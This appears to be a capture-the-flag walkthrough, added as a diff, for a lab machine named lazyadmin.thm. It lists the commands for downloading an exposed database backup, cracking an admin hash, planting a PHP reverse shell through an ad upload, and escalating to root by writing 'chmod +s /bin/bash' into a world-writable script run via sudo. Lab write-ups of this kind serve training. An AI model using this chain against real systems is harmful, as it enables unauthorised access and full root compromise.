@@ -1,0 +1,49 @@
+## Get mysql file
+http://lazyadmin.thm/content/inc/mysql_backup/
+wget http://lazyadmin.thm/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
+
+## The password can be found on https://crackstation.net/
+s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
+manager:Password123
+
+## Create an advertisement with php code from https://www.revshells.com/ (PHP PentestMonkey)
+http://lazyadmin.thm/content/as/?type=ad
+
+## Trigger reverse shell
+http://lazyadmin.thm/content/?action=ads&adname=test11223344
+
+## Able to run command below as root
+www-data@THM-Chal:/home/itguy$ sudo -l
+```
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+```
+
+## Calls /etc/copy.sh
+cat /home/itguy/backup.pl
+```
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+```
+
+## copy.sh is world-writable
+www-data@THM-Chal:/home/itguy$ ls -lah /etc/copy.sh
+-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
+
+## Insert malicious payload
+www-data@THM-Chal:/home/itguy$ echo 'chmod +s /bin/bash' > /etc/copy.sh
+
+## Run command as root via sudo
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
+
+## Confirm that bash now has suid root
+www-data@THM-Chal:/home/itguy$ ls -lah /bin/bash
+-rwsr-sr-x 1 root root 1.1M Jul 12  2019 /bin/bash
+
+## Escalate to root
+www-data@THM-Chal:/home/itguy$ /bin/bash -p
